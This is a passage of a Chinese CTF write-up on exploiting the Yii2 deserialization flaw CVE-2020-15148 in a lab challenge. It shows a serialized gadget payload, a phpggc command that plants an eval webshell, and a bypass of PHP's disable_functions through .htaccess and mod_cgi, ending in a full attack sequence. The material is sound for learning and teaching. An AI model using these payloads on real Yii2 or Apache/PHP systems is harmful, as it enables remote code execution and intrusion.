+<span class="line"><span style="color:#CDD6F4">payload </span><span style="color:#94E2D5">=</span><span style="color:#A6E3A1"> 'O:23:"yii</span><span style="color:#F5C2E7">\\</span><span style="color:#A6E3A1">db</span><span style="color:#F5C2E7">\\</span><span style="color:#A6E3A1">BatchQueryResult":1:{'</span><span style="color:#94E2D5"> +</span><span style="color:#89B4FA"> s</span><span style="color:#9399B2">(</span><span style="color:#CDD6F4">private</span><span style="color:#9399B2">)</span><span style="color:#94E2D5"> +</span><span style="color:#CDD6F4"> db </span><span style="color:#94E2D5">+</span><span style="color:#A6E3A1"> '}'</span></span></code></pre>
+<p>坑：</p>
+<ul>
+<li><strong>类名长度必须精确</strong>：<code>yii\web\DbSession</code> 是 <strong>17</strong> 字节（<code>yii</code>3 + <code>\</code>1 + <code>web</code>3 + <code>\</code>1 + <code>DbSession</code>9）。写成 18 会报 <code>unserialize(): Error at offset 102 of 235 bytes</code>。</li>
+<li>私有属性键名带 <code>\0</code>，长度 = 1 + 类名长 + 1 + 属性长。</li>
+<li>手工拼只能拼静态结构，参数一多变就难受。</li>
+</ul>
+<h3 id="62-phpggc生产用">6.2 phpggc（生产用）</h3>
+<pre class="astro-code catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#CDD6F4">$php </span><span style="color:#94E2D5">=</span><span style="color:#A6E3A1"> 'E:\CTF-Labs\.vendor\php\php.exe'</span></span>
+<span class="line"><span style="color:#CDD6F4">$gg  </span><span style="color:#94E2D5">=</span><span style="color:#A6E3A1"> 'E:\CTF-Labs\.vendor\phpggc\phpggc'</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#94E2D5">&#x26;</span><span style="color:#CDD6F4"> $php $gg Yii2</span><span style="color:#94E2D5">/</span><span style="color:#CDD6F4">RCE2 </span><span style="color:#A6E3A1">'eval($_REQUEST["ant"]);'</span><span style="color:#94E2D5"> -</span><span style="color:#CDD6F4">b</span></span>
+<span class="line"><span style="color:#9399B2;font-style:italic"># TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJc...</span></span></code></pre>
+<p>输出直接 base64，和 wp 里那条一模一样。<strong>这题如果有 phpggc，第一步就结束了</strong>，不需要读一遍 vendor。</p>
+<h2 id="七从-eval-到-flag">七、从 eval 到 flag</h2>
+<p>拿到 eval 之后，按环境一步步来：</p>
+<h3 id="71-先看环境">7.1 先看环境</h3>
+<pre class="astro-code catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#89B4FA;font-style:italic">echo</span><span style="color:#CDD6F4"> $_SERVER</span><span style="color:#9399B2">[</span><span style="color:#A6E3A1">'DOCUMENT_ROOT'</span><span style="color:#9399B2">];</span><span style="color:#9399B2;font-style:italic">   // /var/www/html/web   ← 不是 /var/www/html</span></span>
+<span class="line"><span style="color:#89B4FA;font-style:italic">echo</span><span style="color:#CDD6F4"> $_SERVER</span><span style="color:#9399B2">[</span><span style="color:#A6E3A1">'SCRIPT_FILENAME'</span><span style="color:#9399B2">];</span><span style="color:#9399B2;font-style:italic"> // /var/www/html/web/index.php</span></span></code></pre>
+<h3 id="72-反射查看被禁函数">7.2 反射查看被禁函数</h3>
+<p><code>disable_functions</code> 里包含：</p>
+<pre class="astro-code catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>pcntl_*, exec, shell_exec, popen, proc_open, passthru, symlink, link,</span></span>
+<span class="line"><span>syslog, imap_open, dl, mail, system, putenv</span></span></code></pre>
+<p><code>system</code> 被禁，但 <code>readfile</code> / <code>file_get_contents</code> / <code>file_put_contents</code> 还能用 → 先当文件读取用。</p>
+<h3 id="73-flag-在哪">7.3 flag 在哪</h3>
+<pre class="astro-code catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#89B4FA;font-style:italic">stat</span><span style="color:#9399B2">(</span><span style="color:#A6E3A1">'/flag'</span><span style="color:#9399B2">);</span><span style="color:#9399B2;font-style:italic">        // mode=100600 uid=0 gid=0 size=33</span></span>
+<span class="line"><span style="color:#89B4FA;font-style:italic">readfile</span><span style="color:#9399B2">(</span><span style="color:#A6E3A1">'/flag'</span><span style="color:#9399B2">);</span><span style="color:#9399B2;font-style:italic">    // Permission denied</span></span></code></pre>
+<p><code>/flag</code> 是 <code>0600 root</code>，PHP 跑在 <strong>www-data (uid 33)</strong>，读不了。</p>
+<p>根目录里还有个 <code>/readflag</code>：</p>
+<pre class="astro-code catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#F5C2E7;font-style:italic">#!/bin/bash</span></span>
+<span class="line"><span style="color:#89B4FA;font-style:italic">/usr/bin/tac</span><span style="color:#A6E3A1"> /flag</span></span></code></pre>
+<p>它本身是 <code>0755</code>（<strong>没有 setuid</strong>），但 <code>tac</code> 带特权（setuid 或 file capability）。所以：</p>
+<ul>
+<li><code>cat /flag</code>（www-data）→ 空</li>
+<li><code>/readflag</code> → 出 flag</li>
+</ul>
+<h3 id="74-用-mod_cgi-把命令跑起来">7.4 用 mod_cgi 把命令跑起来</h3>
+<p>PHP 里 exec 系全禁，但 Apache 的 CGI 不受 PHP 的 <code>disable_functions</code> 约束：</p>
+<ol>
+<li>确认 docroot：<code>/var/www/html/web</code></li>
+<li>在该目录下建子目录，写 <code>.htaccess</code>：</li>
+</ol>
+<pre class="astro-code catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4; overflow-x: auto;" tabindex="0" data-language="apache"><code><span class="line"><span style="color:#CBA6F7">Options</span><span style="color:#CDD6F4"> +ExecCGI</span></span>
+<span class="line"><span style="color:#CBA6F7">AddHandler</span><span style="color:#CDD6F4"> cgi-script .sh</span></span></code></pre>
+<ol start="3">
+<li>写脚本 <code>pwn.sh</code>：</li>
+</ol>
+<pre class="astro-code catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4; overflow-x: auto;" tabindex="0" data-language="sh"><code><span class="line"><span style="color:#F5C2E7;font-style:italic">#!/bin/sh</span></span>
+<span class="line"><span style="color:#F38BA8;font-style:italic">echo</span><span style="color:#A6E3A1"> Content-Type:</span><span style="color:#A6E3A1"> text/plain</span></span>
+<span class="line"><span style="color:#F38BA8;font-style:italic">echo</span></span>
+<span class="line"><span style="color:#89B4FA;font-style:italic">id</span></span>
+<span class="line"><span style="color:#89B4FA;font-style:italic">/readflag</span></span></code></pre>
+<ol start="4">
+<li><code>chmod 0755</code></li>
+<li>请求 <code>http://target/pwn/pwn.sh</code></li>
+</ol>
+<p>返回：</p>
+<pre class="astro-code catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span>
+<span class="line"><span>ctfhub{5143a344f0677f681e84d1ce}</span></span></code></pre>
+<p>注意：CGI 以 <strong>www-data</strong> 运行，<code>id</code> 也是 www-data，但 <code>/readflag</code> 能出 flag——因为真正提权的是它调用的 <code>tac</code>。</p>
+<h2 id="八踩过的坑按时间顺序">八、踩过的坑（按时间顺序）</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>#</th><th>现象</th><th>原因</th><th>解决</th></tr></thead><tbody><tr><td>1</td><td>GET 发 payload 完全没反应</td><td>session 未激活，<code>getIsActive()</code> 为 false</td><td>改 POST + <code>_csrf</code></td></tr><tr><td>2</td><td><code>Error at offset 102 of 235 bytes</code></td><td><code>DbSession</code> 类名长度写成 18</td><td>改成 17</td></tr><tr><td>3</td><td>payload 里的 message 没生效</td><td>POST body 覆盖了 query 参数</td><td>payload 放 query，body 只放 <code>_csrf</code></td></tr><tr><td>4</td><td>eval 执行了但页面没输出</td><td><code>prepareDataProvider()</code> 抛异常，Yii 错误页清空输出缓冲</td><td>给 <code>prepareDataProvider</code> 塞 <code>var_dump</code> 兜底（RCE1 链需要；RCE2 不经过这里）</td></tr><tr><td>5</td><td><code>system()</code> 报 disabled</td><td><code>disable_functions</code></td><td>换 <code>readfile</code> / <code>eval</code></td></tr><tr><td>6</td><td>写 webshell 后请求返回首页</td><td>DocumentRoot 是 <code>/var/www/html/web</code></td><td>按 <code>$_SERVER['DOCUMENT_ROOT']</code> 写</td></tr><tr><td>7</td><td><code>readfile('/flag')</code> Permission denied</td><td><code>/flag</code> 是 0600 root</td><td>走 <code>/readflag</code> + mod_cgi</td></tr><tr><td>8</td><td><code>cat /flag</code> 在 CGI 里输出空</td><td><code>cat</code> 没有特权</td><td>用 <code>/readflag</code>（内部是 setuid 的 <code>tac</code>）</td></tr></tbody></table>
+<h2 id="九完整操作序列">九、完整操作序列</h2>
+<pre class="astro-code catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>1. phpggc Yii2/RCE2 'eval($_REQUEST["ant"]);' -b</span></span>
+<span class="line"><span>2. POST /?r=site/about&#x26;message=&#x3C;b64>&#x26;ant=phpinfo();</span></span>
+<span class="line"><span>   body: _csrf=&#x3C;token></span></span>
+<span class="line"><span>3. ant=echo $_SERVER['DOCUMENT_ROOT'];</span></span>
+<span class="line"><span>4. ant=file_put_contents("/var/www/html/web/pwn/.htaccess", base64_decode("..."));</span></span>
+<span class="line"><span>   ant=file_put_contents("/var/www/html/web/pwn/pwn.sh", base64_decode("..."));</span></span>
+<span class="line"><span>   ant=chmod("/var/www/html/web/pwn/pwn.sh",0755);</span></span>
+<span class="line"><span>5. GET /pwn/pwn.sh  → flag</span></span></code></pre>
+<h2 id="十检查清单下次遇到框架反序列化">十、检查清单（下次遇到框架反序列化）</h2>
+<ol>
+<li>框架 + 版本 → 先查 CVE / <code>phpggc -l</code></li>
+<li>有没有 <code>__destruct</code> / <code>__wakeup</code> 入口？</li>
+<li>链条里有没有「必须先满足的运行状态」？（这题是 session 必须激活）</li>
+<li>输出被不被框架吞？（错误页、缓冲区）</li>
+<li>拿到 eval 后：docroot？disable_functions？flag 权限？</li>
+<li>flag 读不到 → <code>/readflag</code>、setuid、mod_cgi</li>
+</ol>
+<h2 id="相关">相关</h2>
+<ul>
+<li>题目 wp：<a href="https://writeup.ctfhub.com/Challenge/2021/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BA%A2%E5%B8%BD%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/Web/gCHKNAHmSZYT4rrGkqiD9Z.html">https://writeup.ctfhub.com/Challenge/2021/第四届红帽杯网络安全大赛/Web/gCHKNAHmSZYT4rrGkqiD9Z.html</a></li>
+<li>phpggc：<a href="https://github.com/ambionics/phpggc">https://github.com/ambionics/phpggc</a></li>
+</ul> </div> <nav class="series-navigation" aria-label="系列文章导航" data-astro-cid-gysqo7gh> <div class="series-navigation-heading" data-astro-cid-gysqo7gh> <div data-astro-cid-gysqo7gh><span class="section-kicker" data-astro-cid-gysqo7gh>继续阅读</span><h2 data-astro-cid-gysqo7gh>CTF Web 进阶三题</h2></div> <a class="series-all" href="/series/#ctf-web-advanced" data-astro-cid-gysqo7gh>完整目录 <span aria-hidden="true" data-astro-cid-gysqo7gh>↗</span></a> </div> <div class="series-links" data-astro-cid-gysqo7gh> <div class="series-boundary" data-astro-cid-gysqo7gh><span class="series-direction" data-astro-cid-gysqo7gh>从这里开始</span><span data-astro-cid-gysqo7gh>这是系列的第一篇</span></div> <a class="series-link series-link--next" href="/posts/ctf-web-advanced-2-easycleanup/" data-astro-cid-gysqo7gh> <span class="series-direction" data-astro-cid-gysqo7gh>下一篇 →</span><span class="series-name" data-astro-cid-gysqo7gh>CTF Web 进阶三题（二）—— EasyCleanup：session.upload_progress 打文件包含</span> </a> </div> </nav> <footer class="article-footer" data-astro-cid-gysqo7gh><a href="/archive/" data-astro-cid-gysqo7gh>← 返回全部文章</a><a href="#article-top" data-astro-cid-gysqo7gh>回到顶部 ↑</a></footer> </article> <aside class="reading-sidebar" aria-label="阅读辅助" data-astro-cid-gysqo7gh> <div class="toc-panel glass" data-astro-cid-gysqo7gh> <div class="toc-heading" data-astro-cid-gysqo7gh><h2 data-astro-cid-gysqo7gh>本文目录</h2><span data-reading-percent data-astro-cid-gysqo7gh>0%</span></div> <nav aria-label="文章目录" data-astro-cid-gysqo7gh> <ol class="toc-list" data-astro-cid-gysqo7gh> <li data-astro-cid-gysqo7gh> <a href="#一题目长什么样" data-toc-link data-astro-cid-gysqo7gh>一、题目长什么样</a> </li><li data-astro-cid-gysqo7gh> <a href="#二入口about-里的-unserialize" data-toc-link data-astro-cid-gysqo7gh>二、入口：about 里的 unserialize</a> </li><li data-astro-cid-gysqo7gh> <a href="#三cve-2020-15148" data-toc-link data-astro-cid-gysqo7gh>三、CVE-2020-15148</a> </li><li data-astro-cid-gysqo7gh> <a href="#四链条拆解rce2" data-toc-link data-astro-cid-gysqo7gh>四、链条拆解（RCE2）</a> </li><li data-astro-cid-gysqo7gh> <a href="#五为什么-get-打不通session-必须已激活" data-toc-link data-astro-cid-gysqo7gh>五、为什么 GET 打不通：session 必须已激活</a> </li><li data-astro-cid-gysqo7gh> <a href="#六手工构造-vs-phpggc" data-toc-link data-astro-cid-gysqo7gh>六、手工构造 vs phpggc</a> </li><li class="toc-subheading" data-astro-cid-gysqo7gh> <a href="#61-手工序列化理解用" data-toc-link data-astro-cid-gysqo7gh>6.1 手工序列化（理解用）</a> </li><li class="toc-subheading" data-astro-cid-gysqo7gh> <a href="#62-phpggc生产用" data-toc-link data-astro-cid-gysqo7gh>6.2 phpggc（生产用）</a> </li><li data-astro-cid-gysqo7gh> <a href="#七从-eval-到-flag" data-toc-link data-astro-cid-gysqo7gh>七、从 eval 到 flag</a> </li><li class="toc-subheading" data-astro-cid-gysqo7gh> <a href="#71-先看环境" data-toc-link data-astro-cid-gysqo7gh>7.1 先看环境</a> </li><li class="toc-subheading" data-astro-cid-gysqo7gh> <a href="#72-反射查看被禁函数" data-toc-link data-astro-cid-gysqo7gh>7.2 反射查看被禁函数</a> </li><li class="toc-subheading" data-astro-cid-gysqo7gh> <a href="#73-flag-在哪" data-toc-link data-astro-cid-gysqo7gh>7.3 flag 在哪</a> </li><li class="toc-subheading" data-astro-cid-gysqo7gh> <a href="#74-用-mod_cgi-把命令跑起来" data-toc-link data-astro-cid-gysqo7gh>7.4 用 mod_cgi 把命令跑起来</a> </li><li data-astro-cid-gysqo7gh> <a href="#八踩过的坑按时间顺序" data-toc-link data-astro-cid-gysqo7gh>八、踩过的坑（按时间顺序）</a> </li><li data-astro-cid-gysqo7gh> <a href="#九完整操作序列" data-toc-link data-astro-cid-gysqo7gh>九、完整操作序列</a> </li><li data-astro-cid-gysqo7gh> <a href="#十检查清单下次遇到框架反序列化" data-toc-link data-astro-cid-gysqo7gh>十、检查清单（下次遇到框架反序列化）</a> </li><li data-astro-cid-gysqo7gh> <a href="#相关" data-toc-link data-astro-cid-gysqo7gh>相关</a> </li> </ol> </nav> <a class="toc-back-top" href="#article-top" data-astro-cid-gysqo7gh>回到顶部 <span aria-hidden="true" data-astro-cid-gysqo7gh>↑</span></a> </div> </aside> </div> <script type="module">const c=document.querySelector("[data-reading-content]");if(c){let S=function(){const e=window.scrollY;d=b.map(i=>i.getBoundingClientRect().top+e);const t=c.getBoundingClientRect();s=Math.max(0,t.top+e-150),y=Math.max(s+1,t.bottom+e-window.innerHeight+48),m=!1},x=function(){u=0,m&&S();const e=window.scrollY,t=Math.round(Math.max(0,Math.min(1,(e-s)/(y-s)))*1e3)/1e3,i=Math.round(t*100);t!==E&&(w&&(w.style.transform=`scaleX(${t})`),E=t),i!==A&&(M.forEach(n=>{n.textContent=`${i}%`}),A=i);let f=0,h=d.length-1,q=0;for(;f<=h;){const n=f+h>>>1;d[n]<=e+160?(q=n,f=n+1):h=n-1}const g=b[q]?.id??"";g!==l&&(r.get(l)?.forEach(n=>{n.removeAttribute("data-active"),n.removeAttribute("aria-current")}),r.get(g)?.forEach(n=>{n.setAttribute("data-active",""),n.setAttribute("aria-current","location")}),l=g)},a=function(){u||(u=window.requestAnimationFrame(x))},o=function(){m=!0,a()};const w=document.querySelector("[data-reading-progress]"),M=document.querySelectorAll("[data-reading-percent]"),p=document.querySelector("[data-mobile-toc]"),v=Array.from(document.querySelectorAll("[data-toc-link]")),r=new Map;v.forEach(e=>{const t=decodeURIComponent(e.hash.slice(1));r.set(t,[...r.get(t)??[],e])});const b=Array.from(c.querySelectorAll("h2[id], h3[id]")).filter(e=>r.has(e.id));let d=[],s=0,y=1,l="",A=-1,E=-1,u=0,m=!0;if(window.addEventListener("scroll",a,{passive:!0}),window.addEventListener("resize",o,{passive:!0}),window.addEventListener("hashchange",a),window.addEventListener("load",o,{once:!0}),"ResizeObserver"in window){const e=new ResizeObserver(o);e.observe(c);const t=document.querySelector("[data-reading-article]");t&&e.observe(t)}document.fonts?.ready.then(o),v.forEach(e=>{e.addEventListener("click",()=>{p?.contains(e)&&(p.open=!1,o());const t=document.getElementById(decodeURIComponent(e.hash.slice(1)));t&&(t.setAttribute("tabindex","-1"),window.requestAnimationFrame(()=>t.focus({preventScroll:!0})))})}),a()}</script>  </main> <footer class="site-footer" data-astro-cid-sz7xmlte> <div class="footer-inner" data-astro-cid-sz7xmlte> <div class="footer-identity" data-astro-cid-sz7xmlte><a href="/" data-astro-cid-sz7xmlte>yyg<span aria-hidden="true" data-astro-cid-sz7xmlte>.</span></a><p data-astro-cid-sz7xmlte>在这里，留下一点思考。</p></div> <div class="footer-end" data-astro-cid-sz7xmlte> <nav class="footer-links" aria-label="联系与订阅" data-astro-cid-sz7xmlte><a href="https://github.com/yangpeter26-bot" target="_blank" rel="noopener noreferrer" data-astro-cid-sz7xmlte>GitHub <span aria-hidden="true" data-astro-cid-sz7xmlte>↗</span></a><a href="/rss.xml" data-astro-cid-sz7xmlte>RSS</a><a href="mailto:yangpeter26@gmail.com" data-astro-cid-sz7xmlte>联系</a></nav> <p data-astro-cid-sz7xmlte>© 2026 yyg<span class="footer-dot" aria-hidden="true" data-astro-cid-sz7xmlte>·</span>记录，学习，继续向前。</p> </div> </div> </footer>  <dialog class="search-dialog" id="search-dialog" aria-labelledby="search-heading" data-astro-cid-otpdt6jm> <div class="search-panel" data-astro-cid-otpdt6jm> <div class="search-topline" data-astro-cid-otpdt6jm><h2 id="search-heading" data-astro-cid-otpdt6jm>找一点想读的</h2><button type="button" class="search-close" id="search-close" aria-label="关闭搜索" data-astro-cid-otpdt6jm><svg viewBox="0 0 24 24" aria-hidden="true" data-astro-cid-otpdt6jm><path d="m6 6 12 12M18 6 6 18" data-astro-cid-otpdt6jm></path></svg></button></div> <label class="search-input-wrap" for="site-search" data-astro-cid-otpdt6jm> <svg viewBox="0 0 24 24" aria-hidden="true" data-astro-cid-otpdt6jm><circle cx="10.8" cy="10.8" r="6.8" data-astro-cid-otpdt6jm></circle><path d="m16 16 4.5 4.5" data-astro-cid-otpdt6jm></path></svg> <input id="site-search" type="search" aria-label="搜索文章关键词" placeholder="搜索标题、摘要、标签或系列…" autocomplete="off" spellcheck="false" aria-controls="search-results" aria-describedby="search-status" data-astro-cid-otpdt6jm> <kbd aria-hidden="true" data-astro-cid-otpdt6jm>esc</kbd> </label> <div class="search-status-row" data-astro-cid-otpdt6jm><p id="search-status" role="status" aria-live="polite" data-astro-cid-otpdt6jm>输入关键词，寻找一篇文章。</p><button type="button" id="search-retry" hidden data-astro-cid-otpdt6jm>重新加载</button></div> <ul class="search-results" id="search-results" aria-label="文章搜索结果" data-astro-cid-otpdt6jm></ul> <div class="search-empty" id="search-empty" hidden data-astro-cid-otpdt6jm><span aria-hidden="true" data-astro-cid-otpdt6jm>⌕</span><p data-astro-cid-otpdt6jm>还没有找到相关内容</p><small data-astro-cid-otpdt6jm>试试短一点的关键词，比如「学习」「CNN」。</small></div> <div class="search-bottomline" data-astro-cid-otpdt6jm><span data-astro-cid-otpdt6jm>在这个小站里，发现一点新东西。</span><span class="keyboard-hint" data-astro-cid-otpdt6jm><kbd data-astro-cid-otpdt6jm>⌘</kbd> / <kbd data-astro-cid-otpdt6jm>Ctrl</kbd> <kbd data-astro-cid-otpdt6jm>K</kbd></span></div> </div> </dialog>  <script type="module" src="/_astro/Layout.astro_astro_type_script_index_0_lang.pFLQCv6D.js"></script> </body> </html>  
